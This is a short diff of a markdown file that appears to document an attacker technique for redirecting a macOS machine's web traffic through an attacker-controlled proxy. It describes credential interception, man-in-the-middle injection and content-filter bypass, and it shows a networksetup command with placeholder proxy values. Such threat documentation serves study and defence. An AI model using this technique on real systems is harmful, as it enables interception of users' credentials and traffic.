@@ -22,11 +22,14 @@ Craft a TTP for bypassing proxy settings:
 
 For a threat actor, this command can be part of a technique to redirect or intercept web traffic on the target machine through a proxy controlled by the attacker. It could be used for various malicious purposes, such as:
 
-#Traffic Interception: The attacker can intercept and analyze web traffic passing through the configured proxy server, potentially capturing sensitive information like login credentials or session tokens.
+## Traffic Interception:
+The attacker can intercept and analyze web traffic passing through the configured proxy server, potentially capturing sensitive information like login credentials or session tokens.
 
-#Man-in-the-Middle (MitM) Attacks: By controlling the proxy server, the attacker can perform man-in-the-middle attacks, altering or injecting content into the communication between the target machine and the web servers.
+## Man-in-the-Middle (MitM) Attacks: 
+By controlling the proxy server, the attacker can perform man-in-the-middle attacks, altering or injecting content into the communication between the target machine and the web servers.
 
-#Bypassing Content Filters: A proxy server can be used to bypass content filters or access restricted content by making requests on behalf of the target machine.
+## Bypassing Content Filters: 
+A proxy server can be used to bypass content filters or access restricted content by making requests on behalf of the target machine.
 ```bash
 # Enable the proxy settings
 networksetup -setwebproxy "Wi-Fi" proxy.<server_address> <Server_Port>
